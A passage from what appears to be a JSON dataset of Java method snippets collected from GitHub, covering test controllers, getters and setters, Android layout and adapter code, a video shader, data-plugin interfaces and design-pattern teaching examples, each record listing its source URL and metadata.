"modifiers": ["public"], "return_type": "void", "snippet": "    public void unauthorized() {\n        throw new BadCredentialsException(\"test authentication failed!\");\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/errors/ExceptionTranslatorTestController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31112, "method_name": "exceptionWithResponseStatus", "class_name": "ExceptionTranslatorTestController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void exceptionWithResponseStatus() {\n        throw new TestResponseStatusException();\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/errors/ExceptionTranslatorTestController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31113, "method_name": "internalServerError", "class_name": "ExceptionTranslatorTestController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void internalServerError() {\n        throw new RuntimeException();\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/errors/ExceptionTranslatorTestController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31114, "method_name": "getTest", "class_name": "TestDTO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getTest() {\n            return test;\n        }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/errors/ExceptionTranslatorTestController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 31115, "method_name": "setTest", "class_name": "TestDTO", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setTest(String test) {\n            this.test = test;\n        }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/errors/ExceptionTranslatorTestController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 31116, "method_name": "getItems", "class_name": "Name", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Item>", "snippet": "  public List<Item> getItems() {\n    return items;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sptests/Name.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31117, "method_name": "setItems", "class_name": "Name", "params": ["List<Item>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setItems(List<Item> items) {\n    this.items = items;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sptests/Name.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31118, "method_name": "getId", "class_name": "Name", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "  public Integer getId() {\n    return id;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sptests/Name.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31119, "method_name": "setId", "class_name": "Name", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setId(Integer id) {\n    this.id = id;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sptests/Name.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31120, "method_name": "getFirstName", "class_name": "Name", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getFirstName() {\n    return firstName;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sptests/Name.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31121, "method_name": "setFirstName", "class_name": "Name", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setFirstName(String firstName) {\n    this.firstName = firstName;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sptests/Name.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31122, "method_name": "getLastName", "class_name": "Name", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getLastName() {\n    return lastName;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sptests/Name.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31123, "method_name": "setLastName", "class_name": "Name", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setLastName(String lastName) {\n    this.lastName = lastName;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sptests/Name.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31124, "method_name": "onMeasure", "class_name": "SimpleLayout", "params": ["int", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {\n        int maxHeight = 0;\n        int maxWidth = 0;\n        int childState = 0;\n\n        // \u6d4b\u91cf\u5b50 View\n        for (int i = 0; i < getChildCount(); i++) {\n            final View child = getChildAt(i);\n            // \u88ab\u6d4b\u91cf\u7684\u5b50 View \u4e0d\u80fd\u662f\u9690\u85cf\u7684\n            if (child.getVisibility() != GONE) {\n                measureChildWithMargins(child, widthMeasureSpec, 0, heightMeasureSpec, 0);\n                final MarginLayoutParams params = (MarginLayoutParams) child.getLayoutParams();\n                maxWidth = Math.max(maxWidth, child.getMeasuredWidth() + params.leftMargin + params.rightMargin);\n                maxHeight = Math.max(maxHeight, child.getMeasuredHeight() + params.topMargin + params.bottomMargin);\n                childState = combineMeasuredStates(childState, child.getMeasuredState());\n            }\n        }\n\n        maxWidth += getPaddingLeft() + getPaddingRight();\n        maxHeight += getPaddingTop() + getPaddingBottom();\n\n        maxWidth = Math.max(maxWidth, getSuggestedMinimumWidth());\n        maxHeight = Math.max(maxHeight, getSuggestedMinimumHeight());\n\n        // \u6d4b\u91cf\u81ea\u8eab\n        setMeasuredDimension(resolveSizeAndState(maxWidth, widthMeasureSpec, childState),\n                resolveSizeAndState(maxHeight, heightMeasureSpec,\n                        childState << MEASURED_HEIGHT_STATE_SHIFT));\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/SimpleLayout.java", "stars": "1", "class_props": {"extends": "ViewGroup", "implements": null, "modifiers": ["final", "public"]}}, {"id": 31125, "method_name": "onLayout", "class_name": "SimpleLayout", "params": ["boolean", "int", "int", "int", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onLayout(boolean changed, int l, int t, int r, int b) {\n        // \u904d\u5386\u5b50 View\n        for (int i = 0; i < getChildCount(); i++) {\n            final View child = getChildAt(i);\n            final MarginLayoutParams params = (MarginLayoutParams) child.getLayoutParams();\n            // \u5c06\u5b50 View \u653e\u7f6e\u5230\u5de6\u4e0a\u89d2\u7684\u4f4d\u7f6e\n            child.layout(getPaddingLeft() + params.leftMargin,\n                    getPaddingTop() + params.topMargin,\n                    getPaddingRight() + child.getMeasuredWidth() + params.rightMargin,\n                    getPaddingBottom() + child.getMeasuredHeight() + params.bottomMargin);\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/SimpleLayout.java", "stars": "1", "class_props": {"extends": "ViewGroup", "implements": null, "modifiers": ["final", "public"]}}, {"id": 31126, "method_name": "generateLayoutParams", "class_name": "SimpleLayout", "params": ["AttributeSet"], "throws": null, "modifiers": ["public"], "return_type": "LayoutParams", "snippet": "    public LayoutParams generateLayoutParams(AttributeSet attrs) {\n        return new MarginLayoutParams(getContext(), attrs);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/SimpleLayout.java", "stars": "1", "class_props": {"extends": "ViewGroup", "implements": null, "modifiers": ["final", "public"]}}, {"id": 31127, "method_name": "generateDefaultLayoutParams", "class_name": "SimpleLayout", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "LayoutParams", "snippet": "    protected LayoutParams generateDefaultLayoutParams() {\n        return new MarginLayoutParams(LayoutParams.MATCH_PARENT, LayoutParams.MATCH_PARENT);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/SimpleLayout.java", "stars": "1", "class_props": {"extends": "ViewGroup", "implements": null, "modifiers": ["final", "public"]}}, {"id": 31128, "method_name": "generateLayoutParams", "class_name": "SimpleLayout", "params": ["LayoutParams"], "throws": null, "modifiers": ["protected"], "return_type": "LayoutParams", "snippet": "    protected LayoutParams generateLayoutParams(LayoutParams p) {\n        return new MarginLayoutParams(p);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/SimpleLayout.java", "stars": "1", "class_props": {"extends": "ViewGroup", "implements": null, "modifiers": ["final", "public"]}}, {"id": 31129, "method_name": "collectDirtyRecord", "class_name": "TaskPluginCollector", "params": ["Record", "Throwable", "String"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void collectDirtyRecord(final Record dirtyRecord,\n                                            final Throwable t, final String errorMessage);\n\n    /**\n     * \u6536\u96c6\u810f\u6570\u636e\n     *\n     * @param dirtyRecord  \u810f\u6570\u636e\u4fe1\u606f\n     * @param errorMessage \u9519\u8bef\u7684\u63d0\u793a\u4fe1\u606f\n     */\n    public void collectDirtyRecord(final Record dirtyRecord,\n                                   final String errorMessage) {\n        this.collectDirtyRecord(dirtyRecord, null, errorMessage);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/plugin/TaskPluginCollector.java", "stars": "23", "class_props": {"extends": null, "implements": ["PluginCollector"], "modifiers": ["public", "abstract"]}}, {"id": 31130, "method_name": "collectDirtyRecord", "class_name": "TaskPluginCollector", "params": ["Record", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void collectDirtyRecord(final Record dirtyRecord,\n                                   final String errorMessage) {\n        this.collectDirtyRecord(dirtyRecord, null, errorMessage);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/plugin/TaskPluginCollector.java", "stars": "23", "class_props": {"extends": null, "implements": ["PluginCollector"], "modifiers": ["public", "abstract"]}}, {"id": 31131, "method_name": "collectDirtyRecord", "class_name": "TaskPluginCollector", "params": ["Record", "Throwable"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void collectDirtyRecord(final Record dirtyRecord, final Throwable t) {\n        this.collectDirtyRecord(dirtyRecord, t, \"\");\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/plugin/TaskPluginCollector.java", "stars": "23", "class_props": {"extends": null, "implements": ["PluginCollector"], "modifiers": ["public", "abstract"]}}, {"id": 31132, "method_name": "collectMessage", "class_name": "TaskPluginCollector", "params": ["String", "String"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void collectMessage(final String key, final String value);\n\n    /**\n     * Collect task's parameter\n     * @param key param key\n     * @param value string value\n     * @param isUnique if is a unique key\n     */\n    public abstract void collectParameter(final String key, final String value, boolean isUnique);\n}\n\n", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/plugin/TaskPluginCollector.java", "stars": "23", "class_props": {"extends": null, "implements": ["PluginCollector"], "modifiers": ["public", "abstract"]}}, {"id": 31133, "method_name": "collectParameter", "class_name": "TaskPluginCollector", "params": ["String", "String", "boolean"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void collectParameter(final String key, final String value, boolean isUnique);\n}\n\n", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/plugin/TaskPluginCollector.java", "stars": "23", "class_props": {"extends": null, "implements": ["PluginCollector"], "modifiers": ["public", "abstract"]}}, {"id": 31134, "method_name": "parseMessage", "class_name": "MessageDecoderFactoryApp", "params": ["ByteBuf"], "throws": null, "modifiers": ["public"], "return_type": "AbstractNetMessage", "snippet": "    public AbstractNetMessage parseMessage(ByteBuf byteBuf) {\n\n        return new AbstractNetMessage();\n    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/coding/decoder/MessageDecoderFactoryApp.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31135, "method_name": "getShader", "class_name": "TemperatureEffect", "params": ["GLSurfaceView"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getShader(GLSurfaceView mGlSurfaceView) {\n\n        String scaleString = \"scale = \" + (2.0f * scale - 1.0f) + \";\\n\";\n\n        String shader = \"#extension GL_OES_EGL_image_external : require\\n\"\n                + \"precision mediump float;\\n\"\n                + \"uniform samplerExternalOES sTexture;\\n\"\n                + \" float scale;\\n\"\n                + \"varying vec2 vTextureCoord;\\n\"\n                + \"void main() {\\n\" // Parameters that were created above\n                + scaleString\n                + \"  vec4 color = texture2D(sTexture, vTextureCoord);\\n\"\n                + \"  vec3 new_color = color.rgb;\\n\"\n                + \"  new_color.r = color.r + color.r * ( 1.0 - color.r) * scale;\\n\"\n                + \"  new_color.b = color.b - color.b * ( 1.0 - color.b) * scale;\\n\"\n                + \"  if (scale > 0.0) { \\n\"\n                + \"    new_color.g = color.g + color.g * ( 1.0 - color.g) * scale * 0.25;\\n\"\n                + \"  }\\n\"\n                + \"  float max_value = max(new_color.r, max(new_color.g, new_color.b));\\n\"\n                + \"  if (max_value > 1.0) { \\n\"\n                + \"     new_color /= max_value;\\n\" + \"  } \\n\"\n                + \"  gl_FragColor = vec4(new_color, color.a);\\n\" + \"}\\n\";\n\n        return shader;\n\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/effect/TemperatureEffect.java", "stars": "2", "class_props": {"extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"id": 31136, "method_name": "getInteger", "class_name": "IjkMediaFormat", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getInteger(String name) {\n        if (mMediaFormat == null)\n            return 0;\n\n        return mMediaFormat.getInt(name);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/misc/IjkMediaFormat.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaFormat"], "modifiers": ["public"]}}, {"id": 31137, "method_name": "getString", "class_name": "IjkMediaFormat", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getString(String name) {\n        if (mMediaFormat == null)\n            return null;\n\n        if (sFormatterMap.containsKey(name)) {\n            Formatter formatter = sFormatterMap.get(name);\n            return formatter.format(this);\n        }\n\n        return mMediaFormat.getString(name);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/misc/IjkMediaFormat.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaFormat"], "modifiers": ["public"]}}, {"id": 31138, "method_name": "format", "class_name": "Formatter", "params": ["IjkMediaFormat"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String format(IjkMediaFormat mediaFormat) {\n            String value = doFormat(mediaFormat);\n            if (TextUtils.isEmpty(value))\n                return getDefaultString();\n            return value;\n        }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/misc/IjkMediaFormat.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["private", "static", "abstract"]}}, {"id": 31139, "method_name": "doFormat", "class_name": "Formatter", "params": ["IjkMediaFormat"], "throws": null, "modifiers": ["abstract", "protected"], "return_type": "String", "snippet": "        protected abstract String doFormat(IjkMediaFormat mediaFormat);\n\n        @SuppressWarnings(\"SameReturnValue\")\n        protected String getDefaultString() {\n            return \"N/A\";\n        }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/misc/IjkMediaFormat.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["private", "static", "abstract"]}}, {"id": 31140, "method_name": "getDefaultString", "class_name": "Formatter", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "String", "snippet": "        protected String getDefaultString() {\n            return \"N/A\";\n        }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/misc/IjkMediaFormat.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["private", "static", "abstract"]}}, {"id": 31141, "method_name": "savePatientInfo", "class_name": "PatientDao", "params": ["Patient"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean savePatientInfo(Patient patient){\n        entityManager.persist(patient);\n        return true;\n    }", "url": "https://raw.githubusercontent.com/chandureddys/spring-boot-doc-appointment/master/src/main/java/com/docappointment/project/dao/PatientDao.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31142, "method_name": "main", "class_name": "CollegeTest", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        College college1 = new College(\"\u5efa\u7b51\u5b66\u9662\");\n        College college2 = new College(\"\u7ecf\u6d4e\u7ba1\u7406\u5b66\u9662\");\n        College college3 = new College(\"\u571f\u6728\u6c34\u5229\u5b66\u9662\");\n        College college4 = new College(\"\u516c\u5171\u7ba1\u7406\u5b66\u9662\");\n        College college5 = new College(\"\u73af\u5883\u5b66\u9662\");\n        College college6 = new College(\"\u9a6c\u514b\u601d\u4e3b\u4e49\u5b66\u9662\");\n\n        CollegeAggregate collegeAggregate = new CollegeAggregateImpl();\n        collegeAggregate.addCollege(college1);\n        collegeAggregate.addCollege(college2);\n        collegeAggregate.addCollege(college3);\n        collegeAggregate.addCollege(college4);\n        collegeAggregate.addCollege(college5);\n        collegeAggregate.addCollege(college6);\n\n        System.out.println(\"-----\u5b66\u9662\u5217\u8868----\");\n        printCollege(collegeAggregate);\n        collegeAggregate.removeCollege(college2);\n        collegeAggregate.removeCollege(college5);\n\n        System.out.println(\"-----\u5220\u9664\u540e\u7684\u5b66\u9662\u5217\u8868----\");\n        printCollege(collegeAggregate);\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/iterator/CollegeTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31143, "method_name": "printCollege", "class_name": "CollegeTest", "params": ["CollegeAggregate"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void printCollege(CollegeAggregate collegeAggregate){\n        CollegeIterator iterator = collegeAggregate.getIterator();\n        while (iterator.hasNextCollege()){\n            College college = iterator.nextCollege();\n            System.out.println(college.getName());\n        }\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/iterator/CollegeTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31144, "method_name": "play", "class_name": "VideoSpeedState", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void play() {\n        super.videoContext.setVideoState(VideoContext.PLAY_STATE);\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/state/VideoSpeedState.java", "stars": "2", "class_props": {"extends": "VideoState", "implements": null, "modifiers": ["public"]}}, {"id": 31145, "method_name": "pause", "class_name": "VideoSpeedState", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void pause() {\n        super.videoContext.setVideoState(VideoContext.VIDEO_PAUSE_STATE);\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/state/VideoSpeedState.java", "stars": "2", "class_props": {"extends": "VideoState", "implements": null, "modifiers": ["public"]}}, {"id": 31146, "method_name": "speed", "class_name": "VideoSpeedState", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void speed() {\n        System.out.println(\"\u89c6\u9891\u6b63\u5904\u5728\u500d\u901f\u64ad\u653e\u72b6\u6001\");\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/state/VideoSpeedState.java", "stars": "2", "class_props": {"extends": "VideoState", "implements": null, "modifiers": ["public"]}}, {"id": 31147, "method_name": "close", "class_name": "VideoSpeedState", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void close() {\n        super.videoContext.setVideoState(VideoContext.VIDEO_CLOSE_STATE);\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/state/VideoSpeedState.java", "stars": "2", "class_props": {"extends": "VideoState", "implements": null, "modifiers": ["public"]}}, {"id": 31148, "method_name": "buyHouse", "class_name": "Husband", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void buyHouse(){\n        System.out.println(\"\u5317\u4eac\u4e8c\u73af\u5185\u4e70\u4e00\u5957\u56db\u5408\u9662!\");\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/24.%E3%80%90Stream%E6%B5%81%E3%80%81%E6%96%B9%E6%B3%95%E5%BC%95%E7%94%A8%E3%80%91%E7%AC%94%E8%AE%B0/code/13_StreamAndMethodReference/src/com/itheima/demo08/ThisMethodReference/Husband.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31149, "method_name": "marry", "class_name": "Husband", "params": ["Richable"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void marry(Richable r){\n        r.buy();\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/24.%E3%80%90Stream%E6%B5%81%E3%80%81%E6%96%B9%E6%B3%95%E5%BC%95%E7%94%A8%E3%80%91%E7%AC%94%E8%AE%B0/code/13_StreamAndMethodReference/src/com/itheima/demo08/ThisMethodReference/Husband.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31150, "method_name": "soHappy", "class_name": "Husband", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void soHappy(){\n        //\u8c03\u7528\u7ed3\u5a5a\u7684\u65b9\u6cd5,\u65b9\u6cd5\u7684\u53c2\u6570Richable\u662f\u4e00\u4e2a\u51fd\u6570\u5f0f\u63a5\u53e3,\u4f20\u9012Lambda\u8868\u8fbe\u5f0f\n       /* marry(()->{\n            //\u4f7f\u7528this.\u6210\u5458\u65b9\u6cd5,\u8c03\u7528\u672c\u7c7b\u4e70\u623f\u5b50\u7684\u65b9\u6cd5\n            this.buyHouse();\n        });*/\n\n        /*\n            \u4f7f\u7528\u65b9\u6cd5\u5f15\u7528\u4f18\u5316Lambda\u8868\u8fbe\u5f0f\n            this\u662f\u5df2\u7ecf\u5b58\u5728\u7684\n            \u672c\u7c7b\u7684\u6210\u5458\u65b9\u6cd5buyHouse\u4e5f\u662f\u5df2\u7ecf\u5b58\u5728\u7684\n            \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528this\u5f15\u7528\u672c\u7c7b\u7684\u6210\u5458\u65b9\u6cd5buyHouse\n         */\n        marry(this::buyHouse);\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/24.%E3%80%90Stream%E6%B5%81%E3%80%81%E6%96%B9%E6%B3%95%E5%BC%95%E7%94%A8%E3%80%91%E7%AC%94%E8%AE%B0/code/13_StreamAndMethodReference/src/com/itheima/demo08/ThisMethodReference/Husband.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31151, "method_name": "main", "class_name": "Husband", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        new Husband().soHappy();\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/24.%E3%80%90Stream%E6%B5%81%E3%80%81%E6%96%B9%E6%B3%95%E5%BC%95%E7%94%A8%E3%80%91%E7%AC%94%E8%AE%B0/code/13_StreamAndMethodReference/src/com/itheima/demo08/ThisMethodReference/Husband.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31152, "method_name": "setUpdate", "class_name": "FundRecordAdapter", "params": ["List<FundRecordBean>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setUpdate(List<FundRecordBean> list) {\n        mCommentList = list;\n        notifyDataSetChanged();\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/adapter/otc/FundRecordAdapter.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 31153, "method_name": "getItemViewType", "class_name": "FundRecordAdapter", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getItemViewType(int position) {\n        return super.getItemViewType(position);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/adapter/otc/FundRecordAdapter.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 31154, "method_name": "onCreateViewHolder", "class_name": "FundRecordAdapter", "params": ["ViewGroup", "int"], "throws": null, "modifiers": ["public"], "return_type": "InfoViewHolder", "snippet": "    public InfoViewHolder onCreateViewHolder(ViewGroup parent, int viewType) {\n        return new InfoViewHolder(LayoutInflater.from(parent.getContext()).inflate(R.layout.fund_record_item, parent, false));\n\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/adapter/otc/FundRecordAdapter.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 31155, "method_name": "onBindViewHolder", "class_name": "FundRecordAdapter", "params": ["InfoViewHolder", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBindViewHolder(InfoViewHolder holder, int position) {\n\n        if (mCommentList.get(position).getStatus() == 0) {\n            holder.status.setText(\"\u5b8c\u6210\");\n            holder.status.setTextColor(ContextCompat.getColor(mContext, R.color.color_000000));\n        } else if (mCommentList.get(position).getStatus() == 1) {\n            holder.status.setText(\"\u8fdb\u884c\u4e2d\");\n            holder.status.setTextColor(ContextCompat.getColor(mContext, R.color.color_00C185));\n        } else {\n            holder.status.setText(\"\u5931\u8d25\");\n            holder.status.setTextColor(ContextCompat.getColor(mContext, R.color.color_FF4742));\n        }\n\n\n        Date currentTime = new Date(mCommentList.get(position).getTime());\n        SimpleDateFormat formatter = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n        String dateString = formatter.format(currentTime);\n\n        holder.timeTv.setText(dateString);\n        holder.numTv.setText(mCommentList.get(position).getNum()+\"\");\n        holder.message.setText(mCommentList.get(position).getMessage());\n        holder.titleTv.setText(mCommentList.get(position).getTitle());\n        if (position > 0 && mCommentList.get(position).getTitle().equals(mCommentList.get(position-1).getTitle())) {\n            holder.titleTv.setVisibility(View.GONE);\n        } else {\n            holder.titleTv.setVisibility(View.VISIBLE);\n        }\n\n        holder.view.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n//                Intent intent = new Intent(mContext, ProductInfoActivity.class);\n//                mContext.startActivity(intent);\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/adapter/otc/FundRecordAdapter.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 31156, "method_name": "getItemCount", "class_name": "FundRecordAdapter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getItemCount() {\n        return mCommentList.size();\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/adapter/otc/FundRecordAdapter.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 31157, "method_name": "setOnClickListener", "class_name": "FundRecordAdapter", "params": 